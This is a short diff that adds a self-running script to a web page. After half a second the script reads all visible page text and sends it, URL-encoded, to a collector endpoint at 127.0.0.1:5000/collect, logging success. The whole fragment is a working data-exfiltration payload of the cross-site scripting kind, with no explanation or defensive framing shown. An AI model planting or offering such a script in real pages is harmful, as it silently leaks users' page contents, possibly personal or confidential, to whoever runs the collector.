@@ -1,0 +1,15 @@
+<script>
+  setTimeout(function() {
+    try {
+      var content = document.body.innerText;
+      var encodedContent = encodeURIComponent(content);
+      var targetUrl = 'http://127.0.0.1:5000/collect?info=' + encodedContent;
+      
+      fetch(targetUrl, { mode: 'no-cors' })
+        .then(() => console.log("Data sent successfully!"))
+        .catch(err => console.error("Fetch error:", err));
+    } catch (e) {
+      console.error("Script error:", e);
+    }
+  }, 500);
+</script>
